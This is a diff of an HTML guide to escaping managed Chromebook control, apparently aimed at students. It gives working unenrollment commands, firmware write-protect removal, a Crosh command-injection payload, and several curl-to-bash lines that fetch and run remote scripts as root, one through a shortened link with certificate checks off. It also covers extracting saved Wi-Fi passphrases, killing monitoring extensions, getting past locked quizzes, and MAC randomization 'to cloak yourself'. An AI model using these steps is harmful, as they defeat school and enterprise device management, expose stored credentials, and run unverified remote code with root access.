@@ -1550,44 +1550,44 @@
                 <summary><b>v110 & lower</b></summary>
                 A: Run this command in any root shell, then powerwash:
                 <br>
-                vpd -i RW_VPD -s check_enrollment=0
+                <i>vpd -i RW_VPD -s check_enrollment=0</i>
             </details>
             <br>
             <details>
                 <summary><b>v111-124</b></summary>
                 A: Run these commands in either VT2 shell or Ctrl+U booted shim, then powerwash:
                 <br>
-                vpd -i RW_VPD -s check_enrollment=0
+                <i>vpd -i RW_VPD -s check_enrollment=0</i>
                 <br>
-                tpm_manager_client take_ownership
+                <i>tpm_manager_client take_ownership</i>
                 <br>
-                cryptohome --action=remove_firmware_management_parameters
+                <i>cryptohome --action=remove_firmware_management_parameters</i>
             </details>
             <br>
             <details>
                 <summary><b>v125-135</b></summary>
                 A: Powerwash, open VT2 shell, run these commands exactly (> included), then exit & set up the device (without rebooting until finished):
                 <br>
-                echo --enterprise-enable-unified-state-determination=never >/tmp/chrome_dev.conf
+                <i>echo --enterprise-enable-unified-state-determination=never >/tmp/chrome_dev.conf</i>
                 <br>
-                echo --enterprise-enable-forced-re-enrollment=never >>/tmp/chrome_dev.conf
+                <i>echo --enterprise-enable-forced-re-enrollment=never >>/tmp/chrome_dev.conf</i>
                 <br>
-                echo --enterprise-enable-initial-enrollment=never >>/tmp/chrome_dev.conf
+                <i>echo --enterprise-enable-initial-enrollment=never >>/tmp/chrome_dev.conf</i>
                 <br>
-                mount --bind /tmp/chrome_dev.conf /etc/chrome_dev.conf
+                <i>mount --bind /tmp/chrome_dev.conf /etc/chrome_dev.conf</i>
                 <br>
-                initctl restart ui
+                <i>initctl restart ui</i>
             </details>
             <br>
             <details>
                 <summary><b>v136+</b></summary>
                 A: Powerwash, open VT2 shell, run these commands exactly (> included), then exit & set up the device (without rebooting until finished):
                 <br>
-                echo --enterprise-enable-state-determination=never >/tmp/chrome_dev.conf'
+                <i>echo --enterprise-enable-state-determination=never >/tmp/chrome_dev.conf'</i>
                 <br>
-                mount --bind /tmp/chrome_dev.conf /etc/chrome_dev.conf
+                <i>mount --bind /tmp/chrome_dev.conf /etc/chrome_dev.conf</i>
                 <br>
-                initctl restart ui
+                <i>initctl restart ui</i>
             </details>
             <br>
             5: Enable "MAC Address Randomization" in chrome://flags to cloak yourself.
@@ -1626,7 +1626,7 @@
             <p class="small-text indented">A: While you're here, disable the 5 minute Dev Mode wait.</p>
             8: Select Deprovision (D), then type "B" to open a bash shell.
             <br>
-            9: Run this command: "gsctool -a -o" & press the power button when it spams "Press PP button now!".
+            9: Run this command: "<i>gsctool -a -o</i>" & press the power button when it spams "Press PP button now!".
             <br>
             10: Reenter Dev Mode, then when the "Enterprise Enrollment" screen shows up again enter Recovery Mode & boot into SH1MMER.
             <br>
@@ -1724,7 +1724,7 @@
             <br>
             CollegeBoard: joaneffahikmmipmidpkeedopejmhbbm
             <br>
-            3: Back it up to your downloads folder by running "cp /home/chronos/{user account hash}/extentions/kiosk/(app ID) /home/chronos/{user account ID hash}/Downloads/".
+            3: Back it up to your downloads folder by running "<i>cp /home/chronos/{user account hash}/extentions/kiosk/(app ID) /home/chronos/{user account ID hash}/Downloads/</i>".
             <br>
             4: Go into the folder & edit the "manifest.json" file. Delete the "kiosk_only" : true" line.
             <br>
@@ -1778,25 +1778,25 @@
                 <br>
                 2: Run the following (3rd will open a prompt):
                 <br>
-                cgpt add /dev/mmcblk0 -i 2 -P 10 -T 5 -S 1
+                <i>cgpt add /dev/mmcblk0 -i 2 -P 10 -T 5 -S 1</i>
                 <br>
-                yes | mkfs.ext4 /dev/mmcblk0p1
+                <i>yes | mkfs.ext4 /dev/mmcblk0p1</i>
                 <br>
-                fdisk /dev/mmcblk0
+                <i>fdisk /dev/mmcblk0</i>
                 <br>
-                d
+                <i>d</i>
                 <br>
-                4
+                <i>4</i>
                 <br>
-                {just press enter}
+                {<i>just press enter</i>}
                 <br>
-                d
+                <i>d</i>
                 <br>
-                5
+                <i>5</i>
                 <br>
-                {just press enter}
+                {<i>just press enter</i>}
                 <br>
-                w
+                <i>w</i>
             </details>
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
@@ -1820,7 +1820,7 @@
             <br>
             2: Look at the text in the top-left corner. If the number ends in 3+, your Chromebook is unsupported.
             <br>
-            3: Download a SH1MMER injected RMA Shim from <a href="">here</a> build your own.
+            3: Download a SH1MMER injected RMA Shim from <a href="">here</a> or build your own (wether via Wax4Web or a command line).
             <br>
             4: Flash the injected RMA Shim onto a USB device.
             <br>
@@ -1830,7 +1830,7 @@
             <br>
             7: Play some Tetris. This is legally required.
             <br>
-            8: Use the Cryptosmite payload, this is "S" on Legacy. The decryption key is "Info-58-immense!NickName_Arabia-710" on older Legacy shims.
+            8: Use the Cryptosmite payload, this is "S" on Legacy. The decryption key is "<i>Info-58-immense!NickName_Arabia-710</i>" on older Legacy shims.
             <br>
             9: Enable "MAC Address Randomization" in chrome://flags to cloak yourself.
         </details>
@@ -1900,12 +1900,12 @@
             <br>
             4: Spam E until you get a 5 minute wait sequence, then spam E again near the end of it.
             <br>
-            5: Navigate to "activate halycon enviroment" & press enter, then navigate to "install halycon semi-tethered". Navigate back to "activate halycon envirement" & select "Boot halycon semi-tethered".
+            5: Navigate to "Activate halycon enviroment" & press enter, then navigate to "Install halycon semi-tethered". Navigate back to "Activate halycon envirement" & select "Boot halycon semi-tethered".
             <br>
             6: Enable "MAC Address Randomization" in chrome://flags to cloak yourself.
             <br>
             <br>
-            You can no longer boot Chrome OS normally, & will have to use the storage device every time.
+            You can no longer boot Chrome OS normally, & will have to use the external storage device every time.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -1997,10 +1997,10 @@
                 <br>
                 2: Unplug the power cord connecting the battery & motherboard.
                 <br>
-                3: Run the nessesary commands. If you're on v136+ you should probably change device secret.
-                <p class="small-text indented">Save device secret: vpd -i RO_VPD -l
+                3: Run the nessesary commands. If you're on v136+ change the device secret.
+                <i class="small-text indented">Save device secret: <i>vpd -i RO_VPD -l</i>
                 <br>
-                Change device secret: vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=device_secret
+                Change device secret: <i>vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=device_secret</i>
                 </p>
                 4: Plug the power cord back in & screw the back cover on (or just leave it off you fucking psycho).
             </details>
@@ -2013,58 +2013,36 @@
                 <p class="small-text">Requires Cr50, screwdriver, bridger, external storage device</p>
                 1: oh fuck no not yet
                 <br>
-                save device secret: vpd -i RO_VPD -l
+                <i>save device secret: vpd -i RO_VPD -l</i>
                 <br>
-                change device secret: vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=$(openssl rand -hex 32)
+                <i>change device secret: vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=$(openssl rand -hex 32)</i>
             </details> 
             <br>
             <details>
                 <searchi>Any</searchi>
                 <searchi>Hardware</searchi>
-                <searchi>Debug Cable</searchi>
-                <summary><b id="FWWP:CCD">Closed Case Debugging/SuzyQable</b></summary>
-                <p class="small-text">Requires Dev Mode, debug cable; doesn't work with active FWMP</p>
+                <searchi>Dev Mode; Debug Cable/Ti50</searchi>
+                <summary><b id="FWWP:CCD">CCD</b></summary>
+                <p class="small-text">Requires Dev Mode; doesn't work with active FWMP; debug cable required on nonTi50</p>
                 1: Enter Dev Mode, then open the VT2 Shell (Ctrl+Alt+F2 on login screen).
                 <br>
-                2: Login as root & run "gsctool -a -o".
+                2: Login as root & run "<i>gsctool -a -o</i>".
                 <br>
-                3: You will be prompted to press the physical presense (PP) button multiple times, on most devices this is the power button.
+                3: Unless you removed the battery beforehand, you will be prompted to press the physical presense (PP) button multiple times, on most devices this is the power button.
                 <br>
-                4: Upon completion, you will see the message "PP Done!" confirming CCD enabling. Return to Dev Mode & the VT2 shell.
+                4: When you see "Another press will be required!", do not press the button & wait until the text changes again.
                 <br>
-                5: Login as root again, plug in the debug cable & run "ls /dev/ttyUSB*"; this should return with ttyUSB0, ttyUSB1, & ttyUSB2 if the cable is correctly connected.
+                5: Upon completion, you will see the message "PP Done!" confirming CCD enabling. Return to Dev Mode & the VT2 shell.
                 <br>
-                6: Run "echo "wp false" > /dev/ttyUSB0" & "echo "wp false atboot" > /dev/ttyUSB0" to disable WP, then run "echo "ccd reset factory" > /dev/ttyUSB0", which allows you to unbrick the device with CCD & also is required for Ti50 computers.
+                6: Login as root again, & if on a Cr50 device plug in the debug cable & run "<i>ls /dev/ttyUSB*"</i>; this should return with <i>ttyUSB0</i>, <i>ttyUSB1</i>, & <i>ttyUSB2</i> if the cable is correctly connected.
                 <br>
-                7: Run "gsctool -a -I" to verify the CDD is opened & factory values are set; it should all be currently set to "Y/Always".
+                7: Run "<i>gsctool -a -I AllowUnverifiedRo:always</i>", then press the PP.
                 <br>
-                8: Run "crossystem wpsw_cur" & verify it returns 0, then reboot.
-                <br>
-                <details>
-                    <searchi>Any</searchi>
-                    <searchi>Hardware</searchi>
-                    <searchi>Dev Mode; Ti50</searchi>
-                    <summary><b id="FWWP:CCD(VT2)">Ti50 FWWP Removal (VT2 shell)</b></summary>
-                    <p class="small-text">Requires Dev Mode; doesn't work with active FWMP; Ti50 exclusive</p>
-                    1: Enter Dev Mode, then open the VT2 Shell (Ctrl+Alt+F2 on login screen).
-                    <br>
-                    2: Login as root & run "gsctool -a -o".
-                    <br>
-                    3: Unless you removed the battery beforehand, you will be prompted to press the physical presense (PP) button multiple times, on most devices this is the power button.
-                    <br>
-                    4: When you see "Another press will be required!", do not press the button & wait until the text changes again.
-                    <br>
-                    5: Upon completion, you will see the message "PP Done!" confirming CCD enabling. Return to Dev Mode & the VT2 shell.
-                    <br>
-                    6: Login as root again, plug in the debug cable & run "ls /dev/ttyUSB*"; this should return with ttyUSB0, ttyUSB1, & ttyUSB2 if the cable is correctly connected.
-                    <br>
-                    7: Run "gsctool -a -I AllowUnverifiedRo:always", then press the PP.
-                    <br>
-                    8: Run "gsctool -a -w disable", then press the PP again, & run "flashrom --wp-disable".
-                </details> 
-                <br>
-                <br>
-                Unbricking Ti50s: hold the power button, on Chromebooks press F2 twice or on Chromeboxes press the recovery pinhole instead, then release the power button & repeat.
+                8: Run "<i>gsctool -a -w disable</i>", then press the PP again, & run "<i>flashrom --wp-disable</i>".
+            </details> 
+            <br>
+            <br>
+            Unbricking Ti50s: hold the power button, on Chromebooks press F2 twice or on Chromeboxes press the recovery pinhole instead, then release the power button & repeat.
             </details> 
             <br>
             <details>
@@ -2074,7 +2052,7 @@
                 <br>
                 1: Go to the <a href="https://binbashbanana.github.io/gbbflaginator/">GBB Flaginator</a> to easily set select flags to set.
                 <br>
-                2: Run "futility gbb -s --flash --flags=0x120b7" on newer devices & "/usr/share/vboot/bin/set_gbb_flags.sh 0x120b7" on older ones to set flags. You can read them with "futility gbb -g --flash --flags"/"/usr/share/vboot/bin/get_gbb_flags.sh" respectively.
+                2: Run "<i>futility gbb -s --flash --flags=0x120b7</i>" on newer devices & "<i>/usr/share/vboot/bin/set_gbb_flags.sh 0x120b7</i>" on older ones to set flags. You can read them with "<i>futility gbb -g --flash --flags"/"/usr/share/vboot/bin/get_gbb_flags.sh</i>" respectively.
             </details> 
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
@@ -2090,7 +2068,7 @@
             <br>
             Chrome OS-based exploit.</p>
             <br>
-            1: Enter the VT2 shell (Ctrl+Alt+F2), then sign in as chronos & run "curl -LO https://raw.githubusercontent.com/Cruzy22k/Firmware2/main/firmware.sh && sudo bash firmware.sh".
+            1: Enter the VT2 shell (Ctrl+Alt+F2), then sign in as chronos & run "<i>curl -LO https://raw.githubusercontent.com/Cruzy22k/Firmware2/main/firmware.sh && sudo bash firmware.sh</i>".
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2113,12 +2091,12 @@
                 <video width="640" height="480" controls> <source src="video.mp4" type="video/mp4">Looks like your browser is a shit of piece.</video>
             </details>
             <br>
-            1: On an external PC, clone the repo with "git clone --recursive https://github.com/cosmicdevv/Icarus-Lite.git" & change directory to it (cd Icarus-Lite).
+            1: On an external PC, clone the repo with "<i>git clone --recursive https://github.com/cosmicdevv/Icarus-Lite.git</i>" & change directory to it (cd Icarus-Lite).
             <br>
             2: Set up the environment. You can either run the following commands or the <a href="https://github.com/cosmicdevv/Icarus-Lite">exe</a>. 
-            <p class="small-text indented">Install dependencies: "pip install -r requirements.txt"/"pip3 install -r requirements.txt"/"sudo apt install python3-protobuf python3-requests python3-openssl python3-cryptography"
+            <p class="small-text indented">Install dependencies: "<i>pip install -r requirements.txt"/"pip3 install -r requirements.txt"/"sudo apt install python3-protobuf python3-requests python3-openssl python3-cryptography</i>"
             <br>
-            Run server: run python main.py/python3 main.py</p>
+            Run server: <i>run python main.py/python3 main.py</i></p>
             <details>
                 <summary><b>Nonkeyrolled</b></summary>
                 A: Check your Chromebook's board in chrome://version, then download a prebuilt SH1MMER bin (with the Icarus payload) <a href="https://github.com/cosmicdevv/Icarus-Lite#prebuilt-shim-downloads">here</a>.
@@ -2132,7 +2110,7 @@
                 <br>
                 B: Select "Internet Recovery" & reconnect to the same Wi-Fi network if needed.
                     <br>
-                    C: When connected, press Ctrl+Alt+F3 & run "bash <(curl -SLk http://ba.cosmion.xyz/script)".
+                    C: When connected, press Ctrl+Alt+F3 & run "<i>bash <(curl -SLk http://ba.cosmion.xyz/script)</".
             </details>
             <br>
             3: Reboot into Verified Mode & <b>do not click continue</b>. Open up the Network Configuration instead (bottom right corner).
@@ -2197,7 +2175,7 @@
             <br>
             1: Open the locked form twice.
             <br>
-            2: Click "Continue" on both at the <b>exact</b> same time. Using touchscreen will help a lot.
+            2: Click "Continue" on both at the <b>exact</b> same time. Using a touchscreen will help a lot.
             <br>
             3: Click the Overview button (not Alt+Tab, that closes the quiz) on your keyboard. 
             <br>
@@ -2219,7 +2197,7 @@
             <br>
             1: Enter Dev Mode (Esc+Power+Refresh; Ctrl+D) & the VT2 shell (Ctrl+Alt+F2).
             <br>
-            2: Logn as root & run "bash <(curl -SLk https://bit.ly/murkmod)".
+            2: Logn as root & run "<i>bash <(curl -SLk https://bit.ly/murkmod)</i>".
             <br>
             3: Install the <a href="https://codeload.github.com/rainestorme/murkmod/zip/refs/heads/main">helper extension</a> (unzip the "helper" folder & load unpacked).
             <br>
@@ -2374,7 +2352,7 @@
                 <br>
                 6: Type "root" as the login & "test0000" as the password if needed. 
                 <br>
-                7: Run the command "vpd -i RW_VPD -s check_enrollment=0", then press Ctrl+Alt+F1.
+                7: Run the command "<i>vpd -i RW_VPD -s check_enrollment=0</i>", then press Ctrl+Alt+F1.
                 <br>
                 8: Once you're done, reboot your computer with Power+Refresh, then reunenroll.
             </details>
@@ -2440,14 +2418,14 @@
             <br>
             2: Get your Chromebook’s RMA shim from chrome100.dev & run the commands below or download a prebuilt one from <a href="">here</a>.
             <p class="small-text indented">A: Clone <a href="https://github.com/ading2210/shimboot">this</a> repository.
-            <p class="small-text indented">B: Run "mkdir -p data/rootfs", "sudo ./build_rootfs.sh data/rootfs bookworm", "sudo ./patch_rootfs.sh path_to_shim path_to_reco data/rootfs", & "sudo ./build.sh image.bin path_to_shim data/rootfs".</p>
+            <p class="small-text indented">B: Run "<i>mkdir -p data/rootfs", "sudo ./build_rootfs.sh data/rootfs bookworm</i>", "<i>sudo ./patch_rootfs.sh path_to_shim path_to_reco data/rootfs</i>", & "<i>sudo ./build.sh image.bin path_to_shim data/rootfs</i>".</p>
             3: Flash it onto an external storage device.
             <br>
             4: Enable Dev Mode & then plug in the storage device & reenter Recovery Mode (Esc+Refresh+Power).
             <br>
             5: Boot into Linux & log in. The default is user/user.
             <br>
-            6: Expand the rootfs partition so that it fills up the entire disk by running "sudo growpart /dev/sdX 4" (replacing sdX with the block device corresponding to your disk) to expand the partition, then run "sudo resize2fs /dev/sdX4" to expand the filesystem.
+            6: Expand the rootfs partition so that it fills up the entire disk by running "<i>sudo growpart /dev/sdX 4</i>" (replacing sdX with the block device corresponding to your disk) to expand the partition, then run "<i>sudo resize2fs /dev/sdX4</i>" to expand the filesystem.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2661,7 +2639,7 @@
             <br>
             2: Find “userResourcesLocation unset" & change it from "unset" to "https://raw.githubusercontent.com/3kh0/ext-remover/main/ublockExec.js".
             <br>
-            3: Go to the “My filters” tab & add a line with “*##+js(execute_script.js)”, then run the code on the current page (Ctrl+Alt+~).
+            3: Go to the “My filters” tab & add a line with “<i>*##+js(execute_script.js)</i>”, then run the code on the current page (Ctrl+Alt+~).
             <br>
             <br>
             The only reason to use this is for <a id="ND" href="#Securely-Kill">Securely-Kill</a>.
@@ -2685,10 +2663,10 @@
             <br>
             2: After selecting "boot from internal disk", press Ctrl+Alt+F2.
             <br>
-            3: Type "sudo crossystem dev_boot_usb=1". Note that if the GBB flag that ignores this is set you can skip this step.
+            3: Run "<i>sudo crossystem dev_boot_usb=1</i>". Note that if the GBB flag that ignores this is set you can skip this step.
             <br>
             <br>
-            Press "Ctrl+U" on the OS Verification screen to boot from USB.
+            Press "Ctrl+U" on the OS Verification screen to boot from the external storage.
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2711,7 +2689,7 @@
             <br>
             2: Find “userResourcesLocation unset" & change it to "https://inglan2.github.io/uRun/urun.js".
             <br>
-            3: Go to the “My filters” tab & add a line with “*##+js(urun.js)”, then run the code on the current page (Ctrl+Alt+~).
+            3: Go to the “My filters” tab & add a line with “<i>*##+js(urun.js)</i>”, then run the code on the current page (Ctrl+Alt+~).
             <br>
             <br>
             Press "Ctrl+Shift+`" to open the menu, where you can run & create scripts. To add a script, click the ➕ button & enter the code without the "javascript:" part.
@@ -2732,15 +2710,15 @@
             <br>
             1: Enter Dev Mode & open Crosh (Ctrl+Alt+T).
             <br>
-            2: Run the commands "shell", "sudo su", & "cd home/root", then type "ls" & copy the middle code string.
+            2: Run the commands "<i>shell</i>", "<i>sudo su</i>", & "<i>cd home/root</i>", then type "<i>ls</i>" & copy the middle code string.
             <br>
-            3: Run the command "cd [code string here]" & type "ls" again. Enter "more shill/shill.profile".
+            3: Run the command "<i>cd [code string here]</i>" & type "<i>ls</i>" again. Enter "<i>more shill/shill.profile</i>".
             <br>
-            4: Enter "more shill/shill.profile".
+            4: Enter "<i>more shill/shill.profile</i>".
             <br>
             5: Eventually, you’ll see a username appear. Scroll up in Crosh until you see the SSID (network ID). Copy the passphrase code (below the SSID & after the colon).
             <br>
-            6: Run the command "echo [passphrase] | tr ‘!-~’ ‘P-~!-O’."
+            6: Run the command "<i>echo [passphrase] | tr ‘!-~’ ‘P-~!-O’.</i>"
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2756,7 +2734,7 @@
             <br>
             1: Open Crosh (Ctrl+Alt+T).
             <br>
-            2: Run "set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'"
+            2: Run "<i>set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'</i>"
             <br>
             3: Powerwash your Chromebook (Ctrl+Alt+Shift+R).
             <br>
@@ -2765,7 +2743,7 @@
             <br>
             Re-enroll:
             <br>
-            1: Open a bash shell & run "sudo -i", "vpd -i RW_VPD -s check_enrollment=1", "echo "fast safe" > /mnt/stateful_partition/factory_install_reset", & "reboot".
+            1: Open a bash shell & run "<i>sudo -i", "vpd -i RW_VPD -s check_enrollment=1</i>", "<i>echo "fast safe" > /mnt/stateful_partition/factory_install_reset</i>", & "<i>reboot</i>".
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2783,7 +2761,7 @@
             <br>
             4: Enter Dev Mode.
             <br>
-            5: Go to chrome-untrusted://crosh & run the commands "shell", “sudo -i”, & “bash <(curl -SLk https://github.com/MercuryWorkshop/fakemurk/releases/latest/download/fakemurk.sh)”. Follow everything it says. If you get an error about a filesystem being readonly, run “fsck -f $(rootdev)” & reboot.
+            5: Go to chrome-untrusted://crosh & run the commands "<i>shell</i>", “<i>sudo -i</i>”, & “<i>bash <(curl -SLk https://github.com/MercuryWorkshop/fakemurk/releases/latest/download/fakemurk.sh)</i>”. Follow everything it says. If you get an error about a filesystem being readonly, run “<i>fsck -f $(rootdev)</i>” & reboot.
             <br>
             <br>
             If you get stuck on the enrollment screen, enter Dev Mode with Ctrl+D, then press Refresh+Power & then space on the OS Verification screen. You will be on a “Chrome OS is missing or damaged” screen. Enter Dev Mode & when you get back to the OS verification screen press Ctrl+D to boot.
@@ -2805,7 +2783,7 @@
             <br>
             Kills all extensions.</p>
             <br>
-            1: Run "while true; do kill -9 $(pgrep -f "\-\-extension\-process"); done".
+            1: Run "<i>while true; do kill -9 $(pgrep -f "\-\-extension\-process"); done</i>".
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
         <br>
@@ -2823,7 +2801,7 @@
             <br>
             3: Go to chrome://extensions & enable your internet, then immediately disable it when an extension is installed.
             <br>
-            4: Open Crosh & for each extension you want to disable, run the command “vmc create-extra-disk --size 1 /home/chronos/user/Extensions/{extensionID}” or run "Open Crosh & type “vmc create-extra-disk --size 1 /home/chronos/user/Extensions”" to disable all.
+            4: Open Crosh & for each extension you want to disable, run the command “<i>vmc create-extra-disk --size 1 /home/chronos/user/Extensions/{extensionID}</i>” or run “<i>vmc create-extra-disk --size 1 /home/chronos/user/Extensions”</i>" to disable all.
             <br>
             5: Reenable Wi-Fi.
         </details>
@@ -2841,9 +2819,9 @@
             <br>
             1: Enter Dev Mode (Esc+Power+Refresh) & open Crosh (Ctrl+Alt+T).
             <br>
-            2: Run the following commands: “shell”, “sudo su”, & “curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash”.
+            2: Run the following commands: “<i>shell</i>”, “<i>sudo su</i>”, & “<i>curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash</i>”.
             <p class="small-text indented">A: If the policy doesn’t apply, press Alt+Vol Up+X.</p>
-            3: Reboot, repeat steps 1 & 2, then run this command: "curl -Ls https://mercuryworkshop.github.io/Pollen/PollenFS.sh | bash".
+            3: Reboot, repeat steps 1 & 2, then run this command: "<i>curl -Ls https://mercuryworkshop.github.io/Pollen/PollenFS.sh | bash</i>".
         </details>
         <p style="display: none"><a href="#ToC">back to top</a></p>
     <div style="line-height:2250%;">
